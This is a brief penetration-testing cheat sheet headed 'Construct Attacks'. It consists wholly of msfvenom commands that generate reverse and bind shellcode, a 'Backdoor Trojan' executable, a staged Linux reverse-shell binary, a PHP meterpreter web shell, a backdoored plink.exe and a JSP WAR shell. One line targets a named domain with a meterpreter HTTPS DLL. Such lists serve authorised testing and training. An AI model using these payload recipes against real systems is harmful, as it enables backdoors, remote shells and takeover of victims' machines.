## Construct Attacks

msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai generate shellcode

msfvenom -p linux/x86/shell_bind_tcp LPORT=443 -f c -a x86 --platform linux -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai generate shellcode

Backdoor Trojan
msfvenom –p windows/shell_reverse_tcp LHOST=$ip2 –f exe > malware.exe && chmod +x malware.exe

Staged Linux Binary
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$ip LPORT=443 -f elf --platform linux -a x86 > /var/www/html/reverse_shell_tcp

PHP Web Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=443 -e php/base64 -f raw > shell.php && add '<?php *** ?>'

Backdoor Executable
msfvenom -a x86 --platform windows -x /var/www/html/plink.exe -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f exe -o bd.exe

WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=443 -f war > r-jsp-shell-443.war

msfvenom -p windows/x64/meterpreter_reverse_https LHOST=unioncentralorchids.com LPORT=443 -f dll